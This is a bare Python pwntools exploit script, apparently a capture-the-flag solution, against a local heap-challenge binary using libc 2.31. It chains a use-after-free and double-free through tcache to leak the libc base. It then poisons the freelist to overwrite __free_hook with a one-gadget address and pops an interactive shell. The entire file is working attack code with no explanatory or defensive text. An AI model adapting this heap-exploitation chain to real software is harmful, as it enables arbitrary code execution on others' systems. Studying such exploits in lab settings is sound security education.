#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./vuln")
p = process("./vuln")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.31.so")

def allocate_small_chunk(item_id):
    p.sendlineafter("> ","b")
    p.recvline()
    p.sendline(str(item_id))
    return item_id

def allocate_fast_chunk(item_id):
    p.sendlineafter("> ","B")
    p.recvline()
    p.sendline(str(item_id))
    return item_id

def edit(index,price,name):
    p.sendlineafter("> ","e")
    p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.sendline(str(price))
    p.recvline()
    p.sendline(name)

def view(index):
    p.sendlineafter("> ","v")
    p.recvline()
    p.sendline(str(index))
    p.recvuntil(f"Item {index}: ")
    leak1 = p.recvline()[:-1]
    p.recvuntil("ID: ")
    leak2 = p.recvline()[:-1]
    p.recvuntil("Price: $")
    leak3 = p.recvline()[:-1]
    return leak1,leak2,leak3

def free(index):
    p.sendlineafter("> ","s")
    p.recvline()
    p.sendline(str(index))

chunk0 = allocate_fast_chunk(0)
chunk1 = allocate_small_chunk(2)
chunk1_alt = allocate_fast_chunk(2)

for i in range(7):
    free(1)
    edit(1,41,'a'*8)

free(1)
item,_id,price = view(1)
_id = int(_id,10)
libc.address = _id-0x3b5be0
log.critical("Libc base address: {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
__malloc_hook = libc.sym.__malloc_hook
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
free(chunk1)
edit(chunk1,41,'a'*8)
free(chunk1)
edit(chunk1,41,p64(0x0))
free(chunk1)
chunk2 = allocate_fast_chunk(__free_hook)
new = allocate_fast_chunk(5)
target = allocate_fast_chunk(libc.address+0xc56ef)
free(6)
p.interactive()


